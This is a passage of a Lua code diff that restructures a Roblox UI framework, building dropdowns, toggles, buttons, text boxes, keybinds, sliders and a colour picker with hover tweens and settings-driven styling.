+      ScaleType = Enum.ScaleType.Fit,
+      Image = "http://www.roblox.com/asset/?id=6282522798",
+      ImageColor3 = Color3.fromRGB(255, 255, 255),
+      Rotation = 270,
+      Size = UDim2.new(0, 16, 0, 20),
+      Position = UDim2.new(0.008, 0, -0.125, 0)
+    })
+    local parentTable1 = framework:Create("Frame", {
+      Parent = holder,
+      BackgroundTransparency = 1,
+      Size = UDim2.new(0, 502, 0, 29)
+    })
+    if 25*#parentTable.options+21 > 200 then
+      parentTable.main = framework:Create("ScrollingFrame", {
+        Parent = parentTable1,
+        CanvasPosition = Vector2.new(0, 0),
+        Size = UDim2.new(0, 504, 0, 200),
+        BackgroundTransparency = 1,
+        CanvasSize = UDim2.new(0, 0, 0, 32*#parentTable.options),
+        ScrollBarImageColor3 = framework.menuSettings.mainColour,
+        BorderColor3 = framework.menuSettings.secondaryColour,
+        BorderSizePixel = 2,
+        ClipsDescendants = true
+      })
+    elseif 25*#parentTable.options+21 < 200 then
+      parentTable.main = framework:Create("Frame", {
+        Parent = parentTable1,
+        Position = UDim2.new(0.044, 0, 0, 0),
+        Size = UDim2.new(0, 480, 0, 301),
+        BackgroundTransparency = 1
+      })
+    end
+    local layoutOptions = framework:Create("UIListLayout", {
+      Parent = parentTable.main,
+      Padding = UDim.new(0, 5)
+    })
+    dropDown.InputBegan:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+              parentTable.open = not parentTable.open
+        if parentTable1:FindFirstChildOfClass("ScrollingFrame") then
+          holder:TweenSize(#parentTable.options > 0 and parentTable.open and UDim2.new(0, 504, 0, 200) or UDim2.new(0, 504, 0, size), "Out", "Quad", 0.2, true)
+        else
+          holder:TweenSize(#parentTable.options > 0 and parentTable.open and UDim2.new(0, 504, 0, layout.AbsoluteContentSize.Y + 25*#parentTable.options+21) or UDim2.new(0, 504, 0, size), "Out", "Quad", 0.2, true)
+        end
+        tweenService:Create(dropDown, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Rotation = parentTable.open and 0 or 270}):Play()
       end
-      tweenService:Create(dropDown, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Rotation = parentTable.open and 0 or 270}):Play()
-    end
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      inContact = true
-      tweenService:Create(titleHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
-    end
-  end)
-  titleHolder.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      inContact = true
-      tweenService:Create(titleHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
-    end
-  end)
-  main.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      parentTable.open = not parentTable.open
-      tweenService:Create(dropDown, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Rotation = parentTable.open and 0 or 270}):Play()
-      if parentTable1:FindFirstChildOfClass("ScrollingFrame") then
-        holder:TweenSize(#parentTable.options > 0 and parentTable.open and UDim2.new(0, 504, 0, 200) or UDim2.new(0, 504, 0, size), "Out", "Quad", 0.2, true)
-      else
-        holder:TweenSize(#parentTable.options > 0 and parentTable.open and UDim2.new(0, 504, 0, layout.AbsoluteContentSize.Y + 25*#parentTable.options+21) or UDim2.new(0, 504, 0, size), "Out", "Quad", 0.2, true)
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+        inContact = true
+        tweenService:Create(titleHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
       end
-    end
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      inContact = true
-      tweenService:Create(titleHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
-    end
-  end)
-  main.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      inContact = false
-      tweenService:Create(titleHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
-    end
-  end)
-  titleHolder.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      inContact = false
-      tweenService:Create(titleHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
-    end
-  end)
-  dropDown.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      inContact = false
-      tweenService:Create(titleHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
-    end
-  end)
-
-  game:GetService("RunService").RenderStepped:Connect(function()
-    if not inContact then
-      titleHolder.BackgroundColor3 = framework.menuSettings.secondaryColour
-      if parentTable1:FindFirstChildOfClass("ScrollingFrame") then
-        parentTable.main.BorderColor3 = framework.menuSettings.secondaryColour
-        parentTable.main.ScrollBarImageColor3 = framework.menuSettings.mainColour
+    end)
+    titleHolder.InputBegan:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+        inContact = true
+        tweenService:Create(titleHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
       end
-    end
-    main.TextSize = framework.menuSettings.textSize
-    main.Font = framework.menuSettings.font
-    main.TextColor3 = framework.menuSettings.textColor
-  end)
-end
-
-local function createHorizontalAlignment(parent, parentTable, subHolder)
-  parentTable.main = framework:Create("Frame", {
-    Parent = parent,
-    Size = UDim2.new(0, 504, 0, 25),
-    BackgroundTransparency = 1,
-    ClipsDescendants = true
-  })
-  local layout = framework:Create("UIListLayout", {
-    Parent = parentTable.main,
-    FillDirection = Enum.FillDirection.Horizontal,
-    Padding = UDim.new(0, 5)
-  })
-end
-
-local function createToggle(option, parent)
-  local holder = framework:Create("Frame", {
-    Parent = parent.main,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 163, 0, 25),
-  })
-  local checkBoxHolder = framework:Create("Frame", {
-    Parent = holder,
-    BackgroundColor3 = framework.menuSettings.secondaryColour,
-    BorderColor3 = Color3.fromRGB(255, 255, 255),
-    BorderSizePixel = 1,
-    Size = UDim2.new(0, 20, 0, 20),
-    Position = UDim2.new(0.037, 0, 0.08, 0),
-  })
-  local checkmark = framework:Create("ImageLabel", {
-    Parent = checkBoxHolder,
-    BackgroundTransparency = 1,
-    Visible = false,
-    Image = "http://www.roblox.com/asset/?id=5226924982",
-    ImageColor3 = framework.menuSettings.mainColour,
-    ScaleType = Enum.ScaleType.Stretch,
-    Position = UDim2.new(0, 0, 0, 0),
-    Size = UDim2.new(0, 20, 0, 20)
-  })
-  local main = framework:Create("TextLabel", {
-    Parent = holder,
-    BackgroundTransparency = 1,
-    TextSize = 15,
-    Text = option.text,
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    Font = framework.menuSettings.font,
-    TextXAlignment = Enum.TextXAlignment.Left,
-    Position = UDim2.new(0.241, 0, -0.04, 0),
-    Size = UDim2.new(0, 129, 0, 25)
-  })
-
-  local inContact
-  checkBoxHolder.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      option:SetState(not option.state)
-      if option.state then
-        checkmark.Visible = true
-      else
-        checkmark.Visible = false
+    end)
+    main.InputBegan:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        parentTable.open = not parentTable.open
+        tweenService:Create(dropDown, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {Rotation = parentTable.open and 0 or 270}):Play()
+        if parentTable1:FindFirstChildOfClass("ScrollingFrame") then
+          holder:TweenSize(#parentTable.options > 0 and parentTable.open and UDim2.new(0, 504, 0, 200) or UDim2.new(0, 504, 0, size), "Out", "Quad", 0.2, true)
+        else
+          holder:TweenSize(#parentTable.options > 0 and parentTable.open and UDim2.new(0, 504, 0, layout.AbsoluteContentSize.Y + 25*#parentTable.options+21) or UDim2.new(0, 504, 0, size), "Out", "Quad", 0.2, true)
+        end
       end
-    end
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      inContact = true
-      tweenService:Create(checkBoxHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = framework.menuSettings.mainColour}):Play()
-      tweenService:Create(main, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = framework.menuSettings.mainColour}):Play()
-    end
-  end)
-  checkBoxHolder.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+        inContact = true
+        tweenService:Create(titleHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
+      end
+    end)
+    main.InputEnded:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
         inContact = false
-        tweenService:Create(checkBoxHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = Color3.fromRGB(255, 255, 255)}):Play()
-        tweenService:Create(main, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
-    end
-  end)
-  main.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      option:SetState(not option.state)
-      if option.state then
-        checkmark.Visible = true
-      else
-        checkmark.Visible = false
+        tweenService:Create(titleHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
       end
-    end
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      tweenService:Create(checkBoxHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = framework.menuSettings.mainColour}):Play()
-      tweenService:Create(main, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = framework.menuSettings.mainColour}):Play()
-    end
-  end)
-  main.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-        tweenService:Create(checkBoxHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BorderColor3 = Color3.fromRGB(255, 255, 255)}):Play()
-        tweenService:Create(main, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = Color3.fromRGB(255, 255, 255)}):Play()
-    end
-  end)
-
-  function option:SetState(state)
-  	framework.flags[self.flag] = state
-  	self.state = state
-  	if state then
-  			checkmark.Visible = true
-  	else
-  			checkmark.Visible = false
-    end
-	  self.callback(state)
-  end
-
-  if option.state then
-	   delay(1, function() option.callback(true) end)
-	end
-
-	setmetatable(option, {__newindex = function(t, i, v)
-		if i == "Text" then
-			main.Text = " " .. tostring(v)
-		end
-	end})
-
-  game:GetService("RunService").RenderStepped:Connect(function()
-      checkmark.ImageColor3 = framework.menuSettings.mainColour
+    end)
+    titleHolder.InputEnded:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+        inContact = false
+        tweenService:Create(titleHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
+      end
+    end)
+    dropDown.InputEnded:Connect(function(input)
+      if input.UserInputType == Enum.UserInputType.MouseMovement then
+        inContact = false
+        tweenService:Create(titleHolder, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
+      end
+    end)
+  
+    game:GetService("RunService").RenderStepped:Connect(function()
       if not inContact then
-        checkBoxHolder.BackgroundColor3 = framework.menuSettings.secondaryColour
-        main.TextSize = framework.menuSettings.textSize
-        main.Font = framework.menuSettings.font
-        main.TextColor3 = framework.menuSettings.textColor
+        titleHolder.BackgroundColor3 = framework.menuSettings.secondaryColour
+        if parentTable1:FindFirstChildOfClass("ScrollingFrame") then
+          parentTable.main.BorderColor3 = framework.menuSettings.secondaryColour
+          parentTable.main.ScrollBarImageColor3 = framework.menuSettings.mainColour
+        end
       end
-  end)
-end
-
-local function createButton(option, parent)
-  local inContact
-  local holder = framework:Create("Frame", {
-    Parent = parent.main,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 163, 0, 25),
-  })
-  local main = framework:Create("TextLabel", {
-    Parent = holder,
-    Size = UDim2.new(0, 154, 0, 18),
-    Position = UDim2.new(0.04, 0, 0.14, 0),
-    BackgroundColor3 = framework.menuSettings.secondaryColour,
-    BorderColor3 = Color3.fromRGB(255, 255, 255),
-    Font = framework.menuSettings.font,
-    TextSize = 15,
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    Text = option.text
-  })
-  main.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-        inContact = true
-        tweenService:Create(main, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
-    end
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      option.callback()
-    end
-  end)
-  main.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-        inContact = false
-        tweenService:Create(main, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
-    end
-  end)
-
-  game:GetService("RunService").RenderStepped:Connect(function()
-    if not inContact then
-      main.BackgroundColor3 = framework.menuSettings.secondaryColour
-    end
-    main.TextSize = framework.menuSettings.textSize
-    main.Font = framework.menuSettings.font
-    main.TextColor3 = framework.menuSettings.textColor
-  end)
-end
-
-local function createColorSetButton(option, parent)
-  local holder = framework:Create("Frame", {
-    Parent = parent.main,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 163, 0, 25),
-  })
-  local main = framework:Create("TextLabel", {
-    Parent = holder,
-    Size = UDim2.new(0, 154, 0, 18),
-    Position = UDim2.new(0.04, 0, 0.14, 0),
-    BackgroundColor3 = option.mainColour,
-    BorderColor3 = option.secondaryColour,
-    Font = framework.menuSettings.font,
-    TextSize = 15,
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    Text = option.text
-  })
-  main.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      framework.menuSettings.mainColour = option.mainColour
-      framework.menuSettings.secondaryColour = option.secondaryColour
-    end
-  end)
-end
-
-local function createLabel(option, parent)
-  local holder = framework:Create("Frame", {
-    Parent = parent.main,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 163, 0, 25),
-  })
-  local main = framework:Create("TextLabel", {
-    Parent = holder,
-    Size = UDim2.new(0, 154, 0, 18),
-    Position = UDim2.new(0.04, 0, 0.14, 0),
-    BackgroundTransparency = 1,
-    BackgroundColor3 = framework.menuSettings.secondaryColour,
-    BorderColor3 = Color3.fromRGB(255, 255, 255),
-    Font = framework.menuSettings.font,
-    TextSize = 15,
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    TextXAlignment = Enum.TextXAlignment.Left,
-    Text = option.text
-  })
-  function option:SetState(state)
-  	main.Text = tostring(state)
-  end
-
-  game:GetService("RunService").RenderStepped:Connect(function()
-    main.TextSize = framework.menuSettings.textSize
-    main.Font = framework.menuSettings.font
-    main.TextColor3 = framework.menuSettings.textColor
-  end)
-end
-
-local function createTextBox(option, parent)
-  local inContact
-  local holder = framework:Create("Frame", {
-    Parent = parent.main,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 350, 0, 25),
-  })
-  local textBox = framework:Create("TextBox", {
-    Parent = holder,
-    Size = UDim2.new(0, 280, 0, 18),
-    Position = UDim2.new(0.016, 0, 0.08, 0),
-    BackgroundColor3 = framework.menuSettings.secondaryColour,
-    BorderColor3 = Color3.fromRGB(255, 255, 255),
-    TextSize = 15,
-    Text = "",
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    PlaceholderColor3 = Color3.fromRGB(255, 255, 255),
-    PlaceholderText = option.text,
-    Font = framework.menuSettings.font,
-    TextXAlignment = Enum.TextXAlignment.Left
-  })
-
-  textBox.InputBegan:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-        inContact = true
-        tweenService:Create(textBox, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.mainColour}):Play()
-    end
-  end)
-
-  textBox.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-        inContact = false
-        tweenService:Create(textBox, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = framework.menuSettings.secondaryColour}):Play()
-    end
-  end)
-
-  textBox.FocusLost:Connect(function()
-    option:SetState(textBox.Text)
-  end)
-
-  function option:SetState(value)
-  		framework.flags[self.flag] = tostring(value)
-      textBox.Text = tostring(value)
-      self.callback(value)
-  end
-
-  game:GetService("RunService").RenderStepped:Connect(function()
-    if not inContact then
-      textBox.BackgroundColor3 = framework.menuSettings.secondaryColour
-    end
-    textBox.TextSize = framework.menuSettings.textSize
-    textBox.Font = framework.menuSettings.font
-    textBox.TextColor3 = framework.menuSettings.textColor
-  end)
-end
-
-local function createBind(option, parent)
-  local binding
-	local holding
-	local loop
-	local text = string.match(option.key, "Mouse") and string.sub(option.key, 1, 5) .. string.sub(option.key, 12, 13) or option.key
-
-  local holder = framework:Create("Frame", {
-    Parent = parent.main,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 350, 0, 25),
-  })
-  local holderMain = framework:Create("Frame", {
-    Parent = holder,
-    Size = UDim2.new(0, 225, 0, 18),
-    Position = UDim2.new(0.04, 0, 0.14, 0),
-    BackgroundColor3 = framework.menuSettings.secondaryColour,
-    BorderColor3 = Color3.fromRGB(255, 255, 255)
-  })
-  local main = framework:Create("TextLabel", {
-    Parent = holderMain,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 141, 0, 19),
-    Position = UDim2.new(0.01, 0, 0, 0),
-    Text = option.text,
-    TextColor3 = framework.menuSettings.textColor,
-    Font = framework.menuSettings.font,
-    TextSize = framework.menuSettings.textSize,
-    TextXAlignment = Enum.TextXAlignment.Left
-  })
-  local bindInput = framework:Create("TextLabel", {
-    Parent = holderMain,
-    BackgroundColor3 = framework.menuSettings.mainColour,
-    BorderSizePixel = 0,
-    Size = UDim2.new(0, 77, 0, 17),
-    Position = UDim2.new(0.658, 0, 0, 0),
-    Text = option.key,
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    Font = framework.menuSettings.font,
-    TextSize = 15
-  })
-
-  main.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      binding = true
-      bindInput.Text = "..."
-    end
-  end)
-
-  bindInput.InputEnded:Connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      binding = true
-      bindInput.Text = "..."
-    end
-  end)
-
-  inputService.InputBegan:Connect(function(input)
-  		if inputService:GetFocusedTextBox() then return end
-  		if (input.KeyCode.Name == option.key or input.UserInputType.Name == option.key) and not binding then
-  			if option.hold then
-  				loop = runService.Heartbeat:connect(function()
-  					if binding then
-  						option.callback(true)
-  						loop:Disconnect()
-  						loop = nil
-  					else
-  						option.callback()
-  					end
-  				end)
-  			else
-  				option.callback()
-  			end
-  		elseif binding then
-  			local key
-  			for i,v in pairs(framework.blacklistedKeys) do
-  				if input.KeyCode == v then
-  					return
-  				else
-  					key = input.KeyCode
-  				end
-  			end
-  			key = key or option.key
-  			option:SetState(key)
-  		end
-	end)
-
-  inputService.InputEnded:Connect(function(input)
-    if input.KeyCode.Name == option.key or input.UserInputType.Name == option.key or input.UserInputType.Name == "MouseMovement" then
-      if loop then
-        loop:Disconnect()
-        loop = nil
-        option.callback(true)
-      end
-    end
-  end)
-
-  function option:SetState(key)
-    binding = false
-    if loop then
-      loop:Disconnect()
-      loop = nil
-    end
-    self.key = key or self.key
-    self.key = self.key.Name or self.key
-    framework.flags[self.flag] = self.key
-    if string.match(self.key, "Mouse") then
-      bindInput.Text = string.sub(self.key, 1, 5) .. string.sub(self.key, 12, 13)
-    else
-      bindInput.Text = self.key
-    end
-  end
-
-  game:GetService("RunService").RenderStepped:Connect(function()
-      holderMain.BackgroundColor3 = framework.menuSettings.secondaryColour
-      bindInput.BackgroundColor3 = framework.menuSettings.mainColour
       main.TextSize = framework.menuSettings.textSize
       main.Font = framework.menuSettings.font
       main.TextColor3 = framework.menuSettings.textColor
-      bindInput.TextSize = framework.menuSettings.textSize
-      bindInput.Font = framework.menuSettings.font
-      bindInput.TextColor3 = framework.menuSettings.textColor
-  end)
-end
-
-local function createSlider(option, parent)
-  local holder = framework:Create("Frame", {
-    Parent = parent.main,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 350, 0, 25),
-  })
-  local main = framework:Create("Frame", {
-    Parent = holder,
-    Position = UDim2.new(0.016, 0, 0.08, 0),
-    Size = UDim2.new(0, 280, 0, 18),
-    BackgroundColor3 = framework.menuSettings.secondaryColour,
-    BorderColor3 = Color3.fromRGB(255, 255, 255)
-  })
-  local slider = framework:Create("Frame", {
-    Parent = main,
-    Position = UDim2.new(0, 0, 0, 0),
-    Size = UDim2.new(0, 280, 0, 18),
-    BackgroundColor3 = framework.menuSettings.mainColour,
-    BorderColor3 = Color3.fromRGB(255, 255, 255)
-  })
-  local inputvalue = framework:Create("TextBox", {
-    Parent = holder,
-    BackgroundTransparency = 1,
-    Position = UDim2.new(0.337, 0, 0.08, 0),
-    Size = UDim2.new(0, 60, 0, 18),
-    Font = framework.menuSettings.font,
-    TextColor3 = framework.menuSettings.textColor,
-    Text = option.value,
-    TextSize = framework.menuSettings.textSize
-  })
-  local title = framework:Create("TextLabel", {
-    Parent = holder,
-    BackgroundTransparency = 1,
-    Font = framework.menuSettings.font,
-    TextSize = framework.menuSettings.textSize,
-    Position = UDim2.new(0.843, 0, 0.08, 0),
-    Size = UDim2.new(0, 103, 0, 18),
-    Text = option.text,
-    TextColor3 = framework.menuSettings.textColor,
-    TextXAlignment = Enum.TextXAlignment.Left
-  })
-
-  if option.min >= 0 then
-    slider.Size = UDim2.new((option.value - option.min) / (option.max - option.min), 0, 1, 0)
-  else
-    slider.Position = UDim2.new((0 - option.min) / (option.max - option.min), 0, 0, 0)
-    slider.Size = UDim2.new(option.value / (option.max - option.min), 0, 1, 0)
-  end
-
-  local sliding
-
-  main.InputBegan:connect(function(input)
-  		if input.UserInputType == Enum.UserInputType.MouseButton1 then
-  			sliding = true
-  			option:SetState(option.min + ((input.Position.X - slider.AbsolutePosition.X) / slider.AbsoluteSize.X) * (option.max - option.min))
-  		end
-	end)
-
-  inputService.InputChanged:connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseMovement and sliding then
-      option:SetState(option.min + ((input.Position.X - slider.AbsolutePosition.X) / slider.AbsoluteSize.X) * (option.max - option.min))
-    end
-  end)
-
-  main.InputEnded:connect(function(input)
-    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-      sliding = false
-    end
-    if input.UserInputType == Enum.UserInputType.MouseMovement then
-      inputvalue:ReleaseFocus()
-    end
-  end)
-
-  inputvalue.FocusLost:connect(function()
-    option:SetState(tonumber(inputvalue.Text) or option.value)
-  end)
-
-  function option:SetState(value)
-    value = round(value, option.float)
-    value = math.clamp(value, self.min, self.max)
-    if self.min >= 0 then
-      slider:TweenSize(UDim2.new((value - self.min) / (self.max - self.min), 0, 0, 18), "Out", "Quad", 0.1, true)
-    else
-      slider:TweenPosition(UDim2.new((0 - self.min) / (self.max - self.min), 0, 0, 0), "Out", "Quad", 0.1, true)
-      slider:TweenSize(UDim2.new(value / (self.max - self.min), 0, 0, 18), "Out", "Quad", 0.1, true)
-    end
-    framework.flags[self.flag] = value
-    self.value = value
-    inputvalue.Text = value
-    self.callback(value)
-  end
-
-  game:GetService("RunService").RenderStepped:Connect(function()
-    if not sliding then
-      main.BackgroundColor3 = framework.menuSettings.secondaryColour
-      slider.BackgroundColor3 = framework.menuSettings.mainColour
-    end
-    inputvalue.TextSize = framework.menuSettings.textSize
-    inputvalue.Font = framework.menuSettings.font
-    inputvalue.TextColor3 = framework.menuSettings.textColor
-    title.TextSize = framework.menuSettings.textSize
-    title.Font = framework.menuSettings.font
-    title.TextColor3 = framework.menuSettings.textColor
-  end)
-end
-
-local function createColourPickerWindow(option)
-  option.topBar = framework:Create("ImageLabel", {
-    Parent = framework.base,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 284, 0, 30),
-    Position = UDim2.new(0, 0, 0, 0),
-    Image = "rbxassetid://3570695787",
-    ImageColor3 = framework.menuSettings.mainColour,
-    BorderColor3 = framework.menuSettings.secondaryColour,
-    ScaleType = Enum.ScaleType.Slice,
-    SliceCenter = Rect.new(100, 100, 100, 100),
-    SliceScale = 0.08
-  })
-
-  option.close = framework:Create("TextLabel", {
-    Parent = option.topBar,
-    BackgroundTransparency = 1,
-    TextSize = framework.menuSettings.textSize,
-    Text = "X",
-    TextColor3 = framework.menuSettings.textColor,
-    Font = framework.menuSettings.font,
-    Position = UDim2.new(0.900, 0, 0, 0),
-    Size = UDim2.new(0, 35, 0, 19)
-  })
-
-  local titleName = framework:Create("TextLabel", {
-    Parent = option.topBar,
-    BackgroundTransparency = 1,
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    Text = option.text.." Picker",
-    Size = UDim2.new(0, 282, 0, 19),
-    Position = UDim2.new(0, 0, 0, 0),
-    Font = framework.menuSettings.font,
-    TextSize = 16
-  })
-
-  local hue, sat, val = Color3.toHSV(option.color)
-  hue, sat, val = hue == 0 and 1 or hue, sat + 0.005, val - 0.005
-  local editinghue
-	local editingsatval
-	local currentColor = option.color
-	local previousColors = {[1] = option.color}
-	local originalColor = option.color
-	local rainbowEnabled
-	local rainbowLoop
-
-  function option:updateVisuals(Color)
-  		currentColor = Color
-  		self.visualize2.ImageColor3 = Color
-  		hue, sat, val = Color3.toHSV(Color)
-  		hue = hue == 0 and 1 or hue
-  		self.satval.BackgroundColor3 = Color3.fromHSV(hue, 1, 1)
-  		self.hueSlider.Position = UDim2.new(1 - hue, 0, 0, 0)
-  		self.satvalSlider.Position = UDim2.new(sat, 0, 1 - val, 0)
-	end
-
-  option.mainHolder = framework:Create("ImageLabel", {
-    Parent = option.topBar,
-    BackgroundTransparency = 1,
-    Size = UDim2.new(0, 284, 0, 199),
-    Position = UDim2.new(-0, 0, 0.639, 0),
-    Image = "rbxassetid://3570695787",
-    ImageColor3 = Color3.fromRGB(10, 10, 10),
-    BorderColor3 = framework.menuSettings.secondaryColour,
-    ScaleType = Enum.ScaleType.Slice,
-    SliceCenter = Rect.new(100, 100, 100, 100),
-    SliceScale = 0.04
-  })
-  local connectorPart = framework:Create("Frame", {
-    Parent = option.mainHolder,
-    BackgroundColor3 = Color3.fromRGB(20, 20, 20),
-    BorderSizePixel = 0,
-    Position = UDim2.new(-0, 0, -0.002, 0),
-    Size = UDim2.new(0, 284, 0, 22),
-  })
-  option.resetColour = framework:Create("TextLabel", {
-    Parent = option.mainHolder,
-    Text = "Reset",
-    Font = framework.menuSettings.font,
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    TextSize = 16,
-    BackgroundColor3 = framework.menuSettings.secondaryColour,
-    BorderColor3 = Color3.fromRGB(255, 255, 255),
-    Size = UDim2.new(0, 72, 0, 15),
-    Position = UDim2.new(0.714, 0, 0.535, 0)
-  })
-  option.undoColour = framework:Create("TextLabel", {
-    Parent = option.mainHolder,
-    Text = "Undo",
-    Font = framework.menuSettings.font,
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    TextSize = 16,
-    BackgroundColor3 = framework.menuSettings.secondaryColour,
-    BorderColor3 = Color3.fromRGB(255, 255, 255),
-    Size = UDim2.new(0, 72, 0, 15),
-    Position = UDim2.new(0.714, 0, 0.644, 0)
-  })
-  option.setColour = framework:Create("TextLabel", {
-    Parent = option.mainHolder,
-    Text = "Set",
-    Font = framework.menuSettings.font,
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    TextSize = 16,
-    BackgroundColor3 = framework.menuSettings.secondaryColour,
-    BorderColor3 = Color3.fromRGB(255, 255, 255),
-    Size = UDim2.new(0, 72, 0, 15),
-    Position = UDim2.new(0.714, 0, 0.758, 0)
-  })
-  option.rainbowColour = framework:Create("TextLabel", {
-    Parent = option.mainHolder,
-    Text = "Rainbow",
-    Font = framework.menuSettings.font,
-    TextColor3 = Color3.fromRGB(255, 255, 255),
-    TextSize = 16,
-    BackgroundColor3 = framework.menuSettings.secondaryColour,
-    BorderColor3 = Color3.fromRGB(255, 255, 255),
-    Size = UDim2.new(0, 72, 0, 15),
-    Position = UDim2.new(0.714, 0, 0.863, 0)
-  })
-  option.satval = framework:Create("ImageLabel", {
-  		ZIndex = 3,
-  		Position = UDim2.new(0, 8, 0, 7),
-  		Size = UDim2.new(0.973, -100, 0.93, -42),
